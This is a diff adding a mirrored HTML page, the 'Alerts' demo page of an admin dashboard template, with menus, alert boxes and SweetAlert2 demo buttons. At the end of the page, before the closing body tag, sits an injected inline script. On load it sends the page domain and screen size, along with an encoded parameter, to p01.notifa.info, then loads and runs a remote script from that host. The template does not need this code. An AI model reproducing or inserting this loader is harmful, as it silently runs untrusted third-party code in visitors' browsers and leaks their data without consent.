@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html>
+
+
+<!-- Mirrored from demo.lorvent.com/clean/alerts.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 08:28:58 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <title>Alerts | Clean Admin</title>
+    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
+    <link rel="shortcut icon" href="img/favicon.ico"/>
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+    <!-- global css -->
+    <link type="text/css" href="css/app.css" rel="stylesheet"/>
+    <link rel="stylesheet" type="text/css" href="css/custom.css">
+    <!-- end of global css -->
+    <!--page level css -->
+    <link rel="stylesheet" type="text/css" href="vendors/sweetalert2/css/sweetalert2.min.css"/>
+    <!--end of page level css-->
+    <style>
+        .swal2-shown{
+            padding-right: 0 !important;
+        }
+    </style>
+</head>
+
+<body>
+<!-- header logo: style can be found in header-->
+<header class="header">
+    <nav class="navbar navbar-expand-lg navbar-light navbar-static-top" role="navigation">
+        <a href="index-2.html" class="logo navbar-brand mr-0">
+            <!-- Add the class icon to your logo image or logo icon to add the margining -->
+            <img src="img/logo_blue.png" alt="logo"/>
+        </a>
+        <!-- Header Navbar: style can be found in header-->
+        <!-- Sidebar toggle button-->
+        <!-- Sidebar toggle button-->
+        <div>
+            <a href="javascript:void(0)" class="navbar-btn mr-sm-auto sidebar-toggle" data-toggle="offcanvas" role="button"> <i
+                    class="fa fa-fw fa-bars"></i>
+            </a>
+        </div>
+        <div class="navbar-right ml-auto">
+            <ul class="nav navbar-nav">
+                <li class="dropdown notifications-menu  nav-item dropdown" >
+                    <a href="javascript:void(0)" class="dropdown-toggle nav-link dropdown-toggle" data-toggle="dropdown" id="navbarDropdown"> <i
+                            class="fa  fa-fw fa-bell-o black"></i>
+                        <span class="badge badge-danger">3</span>
+                    </a>
+                    <ul class="dropdown-menu dropdown-notifications table-striped" aria-labelledby="navbarDropdown">
+                        <li>
+                            <a href="#" class="notification dropdown-item striped-col">
+                                <img class="notif-image rounded-circle" src="img/authors/avatar7.jpg" alt="avatar-image">
+                                <div class="notif-body"><strong>Anderson</strong> shared post from
+                                    <strong>Ipsum</strong>.
+                                    <br>
+                                    <small>Just Now</small>
+                                </div>
+                                <span class="badge badge-success label-mini msg-lable">New</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="notification dropdown-item">
+                                <img class="notif-image rounded-circle" src="img/authors/avatar6.jpg" alt="avatar-image">
+                                <div class="notif-body"><strong>Williams</strong> liked <strong>Lorem Ipsum</strong>
+                                    typesetting.
+                                    <br>
+                                    <small>5 minutes ago</small>
+                                </div>
+                                <span class="badge badge-success label-mini msg-lable">New</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="notification striped-col dropdown-item">
+                                <img class="notif-image rounded-circle" src="img/authors/avatar5.jpg" alt="avatar-image">
+                                <div class="notif-body">
+                                    <strong>Robinson</strong> started follwing <strong>Trac Theme</strong>.
+                                    <br>
+                                    <small>14/10/2014 1:31 pm</small>
+                                </div>
+                                <span class="badge badge-success label-mini msg-lable">New</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="notification dropdown-item">
+                                <img class="notif-image rounded-circle" src="img/authors/avatar1.jpg" alt="avatar-image">
+                                <div class="notif-body">
+                                    <strong>Franklin</strong> Liked <strong>Trending Designs</strong> Post.
+                                    <br>
+                                    <small>5 days ago</small>
+                                </div>
+                            </a>
+                        </li>
+                        <li class="dropdown-footer"><a href="javascript:void(0)">View All messages</a></li>
+                    </ul>
+                </li>
+                <!-- User Account: style can be found in dropdown-->
+                <li class="dropdown user user-menu nav-item dropdown">
+                    <a href="javascript:void(0)" class="dropdown-toggle padding-user nav-link dropdown-toggle" data-toggle="dropdown" id="userDropdown">
+                        <img src="img/authors/user.jpg" class="rounded-circle img-fluid pull-left" alt="User Image">
+
+                        <div class="riot">
+                            <span class="fa fa-sort-down caret"></span>
+                        </div>
+
+                    </a>
+                    <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
+                        <!-- User name-->
+                        <li class="user-name text-center">
+                            <span>Jayson Wiley</span>
+                        </li>
+                        <!-- Menu Body -->
+                        <li class="p-t-3">
+                           <a href="user_profile.html" class="dropdown-item">
+                                Profile<i class="fa fa-fw fa-user pull-right mt-1"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="edit_user.html" class="dropdown-item">
+                                Settings <i class="fa fa-fw fa-cog pull-right  mt-1"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="lockscreen.html" class="dropdown-item">
+                                Lock <i class="fa fa-fw fa-lock pull-right  mt-1"></i>
+                            </a>
+                        </li>
+                        <li>
+                           <a href="login.html" class="dropdown-item">
+                                Logout <i class="fa fa-fw fa-sign-out pull-right  mt-1"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+<div class="wrapper">
+    <!-- Left side column. contains the logo and sidebar -->
+    <aside class="left-aside">
+        <!-- sidebar: style can be found in sidebar-->
+       <section class="sidebar metismenu">
+            <div id="menu" role="navigation">
+                <div class="nav_profile">
+                    <div class="media profile-left">
+                        <a class="pull-left profile-thumb" href="javascript:void(0)">
+                            <img src="img/authors/user.jpg" class="rounded-circle" alt="User Image">
+                        </a>
+                        <div class="content-profile">
+                            <h4 class="media-heading">
+                                Jayson Wiley
+                            </h4>
+                            <p>Admin</p>
+                        </div>
+                    </div>
+                </div>
+                <ul class="navigation">
+                    <li>
+                        <a href="index-2.html">
+                            <i class="menu-icon fa fa-fw fa-home"></i>
+                            <span class="mm-text ">Dashboard 1</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="index2.html">
+                            <i class="menu-icon fa fa-fw fa-dashboard"></i>
+                            <span class="mm-text ">Dashboard 2</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="ui_elements.html">
+                            <i class="menu-icon fa fa-fw fa-cube"></i>
+                            <span class="mm-text ">Elements</span>
+                        </a>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="#">
+                            <i class="menu-icon fa fa-check-square"></i>
+                            <span>Forms</span>
+                            <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="form_elements.html">
+                                    <i class="fa fa-fw fa-fire"></i> Form Elements
+                                </a>
+                            </li>
+                            <li>
+                                <a href="form_features.html">
+                                    <i class="fa fa-fw fa-file-text-o"></i> Form Features
+                                </a>
+                            </li>
+                            <li>
+                                <a href="form_components.html">
+                                    <i class="fa fa-fw fa-warning"></i> Form Components
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="typography.html">
+                            <i class="menu-icon fa fa-fw fa-table"></i>
+                            <span class="mm-text ">Typography</span>
+                        </a>
+                    </li>
+                    <li class="menu-dropdown active">
+                        <a href="#">
+                            <i class="menu-icon fa fa-desktop"></i>
+                            <span>
+                                    UI Components
+                                </span>
+                            <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu active">
+                            <li>
+                                <a href="notifications.html">
+                                    <i class="fa fa-fw fa-flag"></i> Notifications
+                                </a>
+                            </li>
+                            <li>
+                                <a href="icons.html">
+                                    <i class="fa fa-fw fa-font"></i> Icons
+                                </a>
+                            </li>
+                            <li>
+                                <a href="timeline.html">
+                                    <i class="fa fa-fw fa-columns"></i> Timeline
+                                </a>
+                            </li>
+                            <li class="active" id="active">
+                                <a href="alerts.html">
+                                    <i class="fa fa-fw fa-suitcase"></i> Alerts
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="widgets.html">
+                            <i class="menu-icon fa fa-fw fa-shopping-basket"></i>
+                            <span class="mm-text "> Widgets</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="calendar.html">
+                            <i class="menu-icon fa fa-fw fa-calendar"></i>
+                            <span>Calendar</span>
+                        </a>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="#">
+                            <i class="menu-icon fa fa-bar-chart-o"></i>
+                            <span>Charts</span> <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="flot_knob_charts.html">
+                                    <i class="fa fa-fw fa-area-chart"></i> Flot & Knob Charts
+                                </a>
+                            </li>
+                            <li>
+                                <a href="advanced_charts.html">
+                                    <i class="fa fa-fw fa-line-chart"></i> Advanced Charts
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="#"> <i class="menu-icon fa fa-table"></i>
+                            <span>Tables</span>
+                            <span class="fa arrow">
+                                </span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="simple_tables.html">
+                                    <i class="fa fa-fw fa-tasks"></i> Simple tables
+                                </a>
+                            </li>
+                            <li>
+                                <a href="advanced_tables.html">
+                                    <i class="fa fa-fw fa-table"></i> Advanced Tables
+                                </a>
+                            </li>
+                            <li>
+                                <a href="responsive_datatables.html">
+                                    <i class="fa fa-fw fa-table"></i> Responsive DataTables
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="#">
+                            <i class="menu-icon fa fa-fw fa-users"></i>
+                            <span>Users</span> <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="user_profile.html">
+                                    <i class="fa fa-fw fa-user-md"></i> User Profile
+                                </a>
+                            </li>
+                            <li>
+                                <a href="addnew_user.html">
+                                    <i class="fa fa-fw fa-user"></i> Add New User
+                                </a>
+                            </li>
+                            <li>
+                                <a href="users_list.html">
+                                    <i class="fa fa-list" aria-hidden="true"></i> Users List
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="gv_maps.html">
+                            <i class="menu-icon fa fa-map-marker"></i>
+                            <span>Maps</span>
+                        </a>
+                    </li>
+                    <li class="menu-dropdown ">
+                        <a href="#">
+                            <i class="menu-icon fa fa-files-o"></i>
+                            <span>Pages</span>
+                            <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="session_timeout.html">
+                                    <i class="fa fa-fw fa-list-alt"></i> Session Timeout
+                                </a>
+                            </li>
+                            <li>
+                                <a href="login.html">
+                                    <i class="fa fa-fw fa-sign-in"></i> Login
+                                </a>
+                            </li>
+                            <li>
+                                <a href="register.html">
+                                    <i class="fa fa-fw fa-sign-out"></i> Register
+                                </a>
+                            </li>
+                            <li>
+                                <a href="forgot_password.html">
+                                    <i class="fa fa-fw fa-bars"></i> Forgot Password
+                                </a>
+                            </li>
+                            <li>
+                                <a href="reset_password.html">
+                                    <i class="fa fa-fw fa-th-large"></i> Reset Password
+                                </a>
+                            </li>
+                            <li>
+                                <a href="lockscreen.html">
+                                    <i class="fa fa-fw fa-lock"></i> Lockscreen
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="#">
+                            <i class="menu-icon fa fa-th"></i>
+                            <span>Extra Pages</span>
+                            <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="blank.html">
+                                    <i class="fa fa-fw fa-file-o"></i> Blank
+                                </a>
+                            </li>
+                            <li>
+                                <a href="invoice.html">
+                                    <i class="fa fa-fw fa-newspaper-o"></i> Invoice
+                                </a>
+                            </li>
+                            <li>
+                                <a href="contact_us.html">
+                                    <i class="fa fa-fw fa-phone"></i> Contact Us
+                                </a>
+                            </li>
+                            <li>
+                                <a href="404.html">
+                                    <i class="fa fa-fw fa-unlink"></i> 404 Error
+                                </a>
+                            </li>
+                            <li>
+                                <a href="500.html">
+                                    <i class="fa fa-fw fa-frown-o"></i> 500 Error
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="menu-dropdown">
+                        <a href="#">
+                            <i class="menu-icon fa fa-sitemap"></i>
+                            <span>
+                                    Menu levels
+                                </span>
+                            <span class="fa arrow"></span>
+                        </a>
+                        <ul class="sub-menu">
+                            <li>
+                                <a href="javascript:void(0)">
+                                    <i class="fa fa-fw fa-sitemap"></i> Level 1
+                                </a>
+                            </li>
+                            <li>
+                                <a href="#">
+                                    <i class="fa fa-fw fa-sitemap"></i> Level 1
+                                    <span class="fa arrow"></span>
+                                </a>
+                                <ul class="sub-menu sub-submenu">
+                                    <li>
+                                        <a href="#">
+                                            <i class="fa fa-fw fa-sitemap"></i> Level 2
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="#">
+                                            <i class="fa fa-fw fa-sitemap"></i> Level 2
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="#">
+                                            <i class="fa fa-fw fa-sitemap"></i> Level 2
+                                            <span class="fa arrow"></span>
+                                        </a>
+                                        <ul class="sub-menu sub-submenu">
+                                            <li>
+                                                <a href="#">
+                                                    <i class="fa fa-fw fa-sitemap"></i> Level 3
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <i class="fa fa-fw fa-sitemap"></i> Level 3
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <i class="fa fa-fw fa-sitemap"></i> Level 3
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </li>
+                </ul>
+                <!-- / .navigation -->
+            </div>
+            <!-- menu -->
+        </section>
+        <!-- /.sidebar -->
+    </aside>
+    <aside class="right-aside">
+        <!-- Content Header (Page header) -->
+        <section class="content-header">
+            <h1>Alerts</h1>
+        </section>
+        <!-- Main content -->
+        <section class="content">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="card-title">Alerts</h3>
+                        </div>
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <div class="alert alert-success">
+                                        <a href="#" class="close" data-dismiss="alert">
+                                            &times;
+                                        </a>
+                                        <strong>Success!</strong> the result is successful.
+                                    </div>
+                                    <div class="alert alert-warning">
+                                        <a href="#" class="close" data-dismiss="alert">&times;</a>
+                                        <strong>Warning!</strong> There was a problem with your network connection.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="card-title">Sweet Alert 2</h3>
+                        </div>
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block  " id="basic">A basic alert
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block  " id="title">Title alert
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block  " id="success">Success alert
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block  " id="warning">Warning alert
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block  " id="params">Parameter
+                                        alert
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block  " id="image">Custom image
+                                        alert
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block " id="close">Auto close alert
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block " id="html-alert">Html
+                                        description
+                                    </button>
+                                </div>
+
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block " id="padding-width-alert">
+                                        Custom background
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block " id="ajax-alert">Ajax
+                                        request
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block " id="chaining-alert">Chaining
+                                        modals
+                                    </button>
+                                </div>
+                                <div class="col-md-4 margin-bottom-10">
+                                    <button type="button" class="btn btn-white btn-block " id="dynamic-alert">Dynamic
+                                        queue
+                                    </button>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- /.content -->
+    </aside>
+    <!-- /.right-side -->
+</div>
+<!-- ./wrapper -->
+<!-- global js -->
+<script src="js/app.js" type="text/javascript"></script>
+<!-- end of page level js -->
+<!-- begining of page level js -->
+<script type="text/javascript" src="vendors/sweetalert2/js/sweetalert2.min.js"></script>
+<script type="text/javascript" src="js/pages/alerts.js"></script>
+<!-- end of page level js -->
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdYlWI2d16ypslxj5V08CKVS%2bWl466GVpbSMifc4n2g0Rm5n%2fJq0sYuerUq7vvws%2b6XybvSO%2bzVkNJQvNgNkxLptaIBkjulKYgR99dX8zcFj0zC%2bPWrTrwahwW18byTUwwJzlCBPtJ2HegfseeulN%2flc2Y7KgVkJGxBkzjfvQlcUi8OWIKuhZFJjznbcDbzAuL6y%2bdQ8ORDiyig3Rl%2bgeiYQcAyS1%2bUvZLh6BgNKaSw9kl0DXevg07vqbdUBT17%2brGJWRbN%2f6dki4vXgsNQynnXuW8XhDCKyy8hDKZJdqHhscDf641cUkvwVPUBVz6jhBadYdcElXsxcwCN38LX%2bbDM%2fDvnbVC1ebUxmCZonzQg0XceSo%2bl%2bNg3%2b9rCEEKV2MOagbwjdEuotGXVGr10T9QnKEU35qM5%2fyWh%2fY0Yx1JSMRASXPx3TnBF%2b3fdM8ed7AvLZHPGpSMVPPvHGsZTGqQM8bsWSByurgMD%2bGbTjVfug4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+<!-- Mirrored from demo.lorvent.com/clean/alerts.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 08:29:00 GMT -->
+</html>
